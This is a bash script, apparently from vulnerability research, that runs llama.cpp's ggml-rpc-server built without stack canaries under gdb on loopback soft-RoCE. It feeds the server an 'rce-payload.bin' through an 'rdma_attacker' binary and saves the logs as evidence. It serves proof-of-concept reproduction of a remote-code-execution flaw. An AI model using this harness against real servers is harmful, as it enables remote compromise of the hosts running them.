#!/usr/bin/env bash
# Run the no-canary server under gdb and deliver the raw RDMA payload.
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WIRE="$ROOT/wire"
EVID="$WIRE/evidence"
PORT=53057
CREATED=0
GDB_PID=""
TAG="${TAG:-rce-gdb}"
PAYLOAD="${RDMA_PAYLOAD_FILE:-$EVID/rce-payload.bin}"
LOG="$EVID/$TAG.log"

cleanup() {
  if [ -n "$GDB_PID" ]; then kill "$GDB_PID" 2>/dev/null || true; wait "$GDB_PID" 2>/dev/null || true; fi
  if [ "$CREATED" -eq 1 ]; then sudo -n rdma link del rxe0 2>/dev/null || true; fi
}
trap cleanup EXIT

if ! sudo -n rdma link show 2>/dev/null | grep -q rxe0; then
  sudo -n modprobe rdma_rxe || exit 2
  sudo -n rdma link add rxe0 type rxe netdev lo || exit 2
  CREATED=1
fi

: > "$LOG"
gdb -q --batch -x "$WIRE/gdb-rce-observe.cmd" --args \
  "$ROOT/src/llama.cpp-pin-nocanary/bin/ggml-rpc-server" -H 127.0.0.1 -p "$PORT" \
  > "$LOG" 2>&1 &
GDB_PID=$!
for _ in $(seq 1 100); do
  grep -q 'Starting RPC server' "$LOG" && break
  sleep 0.1
done
grep -q 'Starting RPC server' "$LOG" || { echo "server did not start" >&2; sed -n '1,30p' "$LOG" >&2; exit 3; }

RDMA_PAYLOAD_FILE="$PAYLOAD" "$WIRE/rdma_attacker" 127.0.0.1 "$PORT" 4608 \
  > "$EVID/client-$TAG.log" 2>&1
CLIENT_RC=$?
for _ in $(seq 1 100); do
  grep -qE 'INFERIOR STOPPED|exited normally' "$LOG" && break
  sleep 0.1
done
sleep 1
kill "$GDB_PID" 2>/dev/null || true
wait "$GDB_PID" 2>/dev/null || true
GDB_PID=""
echo "client_rc=$CLIENT_RC payload=$PAYLOAD"
echo "--- client ---"; cat "$EVID/client-$TAG.log"
echo "--- gdb tail ---"; tail -60 "$LOG"
